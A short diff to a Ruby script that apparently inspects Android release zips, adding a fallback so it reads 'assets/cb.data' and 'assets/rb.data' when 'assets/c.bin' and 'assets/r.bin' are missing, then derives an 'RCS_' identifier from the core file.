@@ -80,10 +80,15 @@ checking /Volumes/SHARE/RELEASE/SVILUPPO/previous cores//8.4.0/android.zip
     end
 
     Zip::File.open(file) do |z|
-      conf = z.file.open('assets/c.bin', "rb") { |f| f.read }
-      core = z.file.open('assets/r.bin', "rb") { |f| f.read }
-      digest = z.file.open('classes.dex', "rb") { |f| Digest::MD5.hexdigest(f.read)}
-
+      begin
+        conf = z.file.open('assets/c.bin', "rb") { |f| f.read }
+        core = z.file.open('assets/r.bin', "rb") { |f| f.read }
+        digest = z.file.open('classes.dex', "rb") { |f| Digest::MD5.hexdigest(f.read)}
+      rescue
+        conf = z.file.open('assets/cb.data', "rb") { |f| f.read }
+        core = z.file.open('assets/rb.data', "rb") { |f| f.read }
+        digest = z.file.open('classes.dex', "rb") { |f| Digest::MD5.hexdigest(f.read)}
+      end
     end
 
     ident = 'RCS_' + core[4..13]
